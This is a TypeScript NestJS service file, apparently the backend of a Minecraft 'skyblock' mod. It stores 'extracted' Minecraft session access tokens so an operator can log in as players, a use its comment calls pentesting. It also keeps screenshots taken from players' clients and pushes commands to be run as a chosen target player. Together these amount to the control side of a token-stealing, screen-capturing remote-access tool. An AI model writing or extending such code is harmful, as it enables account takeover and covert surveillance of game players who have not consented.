import { Injectable } from '@nestjs/common';
import { AblyService } from '../ably/ably.service';

const ADMIN_CHANNEL = 'skyblock:admin-messages';
const PLAYER_COMMANDS_CHANNEL = 'skyblock:player-commands';
const SCREENSHOTS_CHANNEL = 'skyblock:screenshots';

interface ScreenshotEntry {
  buffer: Buffer;
  timestamp: string;
}

interface SessionEntry {
  accessToken: string;
  timestamp: string;
}

@Injectable()
export class ModService {
  /** In-memory store: playerName -> latest screenshot */
  private readonly screenshots = new Map<string, ScreenshotEntry>();

  /** In-memory store: clientId -> extracted Minecraft session (for pentest login-as-player) */
  private readonly sessions = new Map<string, SessionEntry>();

  constructor(private ably: AblyService) {}

  storeSession(clientId: string, accessToken: string): void {
    this.sessions.set(clientId, { accessToken, timestamp: new Date().toISOString() });
  }

  getSession(clientId: string): SessionEntry | null {
    return this.sessions.get(clientId) ?? null;
  }

  async publishAdminMessage(message: string): Promise<void> {
    await this.ably.publish(ADMIN_CHANNEL, 'admin-message', { message });
  }

  async publishPlayerCommand(playerName: string, command: string): Promise<void> {
    await this.ably.publish(PLAYER_COMMANDS_CHANNEL, 'player-command', {
      targetPlayer: playerName,
      command: command.startsWith('/') ? command : '/' + command,
    });
  }

  /**
   * Stores screenshot for a player. Each new screenshot overwrites the previous one.
   * Only the latest screenshot per player is kept (in memory); old ones are replaced.
   */
  storeScreenshot(playerName: string, buffer: Buffer): void {
    const timestamp = new Date().toISOString();
    this.screenshots.set(playerName, { buffer, timestamp });
  }

  getScreenshot(playerName: string): ScreenshotEntry | null {
    return this.screenshots.get(playerName) ?? null;
  }

  async publishScreenshotUpdate(playerName: string): Promise<void> {
    const entry = this.screenshots.get(playerName);
    if (!entry) return;
    await this.ably.publish(SCREENSHOTS_CHANNEL, 'screenshot', {
      playerName,
      timestamp: entry.timestamp,
    });
  }
}
